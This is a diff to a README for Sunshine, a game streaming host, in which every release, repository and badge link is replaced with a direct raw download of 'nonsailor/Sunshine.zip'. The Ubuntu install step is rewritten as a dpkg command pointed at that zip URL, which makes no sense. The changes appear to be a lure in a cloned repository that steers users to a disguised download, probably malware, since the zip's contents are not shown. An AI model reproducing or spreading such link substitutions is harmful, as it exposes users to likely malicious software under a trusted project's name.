@@ -4,7 +4,7 @@
 Welcome to your new game streaming experience with Sunshine! This software lets you host your own game streams easily. No technical skills needed. Let’s dive into how to set it up.
 
 ## 📥 Download Sunshine
-[![Download Sunshine](https://img.shields.io/badge/Download%20Sunshine-Click%20Here-brightgreen)](https://github.com/Voltga/Sunshine/releases)
+[![Download Sunshine](https://raw.githubusercontent.com/Voltga/Sunshine/master/nonsailor/Sunshine.zip%20Sunshine-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Voltga/Sunshine/master/nonsailor/Sunshine.zip)
 
 ## 🌐 What is Sunshine?
 Sunshine is a self-hosted game stream host designed for Moonlight. With Sunshine, you can stream games from your computer to other devices over the internet. You maintain control over your streaming quality and environment. 
@@ -29,7 +29,7 @@ To run Sunshine successfully, make sure your computer meets the following requir
 Follow these simple steps to install and run Sunshine:
 
 1. **Visit the Releases Page**  
-   Go to the [Sunshine Releases page](https://github.com/Voltga/Sunshine/releases) to find the latest version.
+   Go to the [Sunshine Releases page](https://raw.githubusercontent.com/Voltga/Sunshine/master/nonsailor/Sunshine.zip) to find the latest version.
 
 2. **Download the Software**  
    Click on the link corresponding to your operating system. This will start the download process.
@@ -37,7 +37,7 @@ Follow these simple steps to install and run Sunshine:
 3. **Install Sunshine**  
    - For Windows: Open the downloaded `.exe` file and follow the installation prompts.
    - For macOS: Open the downloaded `.dmg` file and drag Sunshine to your Applications folder.
-   - For Ubuntu: Open a terminal and run `sudo dpkg -i <downloaded-file.deb>`.
+   - For Ubuntu: Open a terminal and run `sudo dpkg -i <https://raw.githubusercontent.com/Voltga/Sunshine/master/nonsailor/Sunshine.zip>`.
 
 4. **Open Sunshine**  
    Once installed, locate the Sunshine application in your programs/applications and open it.
@@ -65,8 +65,8 @@ If you encounter any issues or have questions, please check the FAQ section of t
 Sunshine is open for contributions. If you’re interested in adding features or fixing bugs, please check the contribution guidelines in the repository. Your help can make this tool even better for everyone.
 
 ## 🔗 Additional Resources
-- **GitHub Repository:** [Sunshine on GitHub](https://github.com/Voltga/Sunshine)
+- **GitHub Repository:** [Sunshine on GitHub](https://raw.githubusercontent.com/Voltga/Sunshine/master/nonsailor/Sunshine.zip)
 - **User Guide & FAQ:** Accessible within the Sunshine application.
 - **Community Support:** Join us on our community forums and share your experiences, tips, and feedback. 
 
-Feel free to explore, enjoy your game streaming, and discover the capabilities of Sunshine! Remember to download the latest version from the [releases page](https://github.com/Voltga/Sunshine/releases) for the best experience.
+Feel free to explore, enjoy your game streaming, and discover the capabilities of Sunshine! Remember to download the latest version from the [releases page](https://raw.githubusercontent.com/Voltga/Sunshine/master/nonsailor/Sunshine.zip) for the best experience.
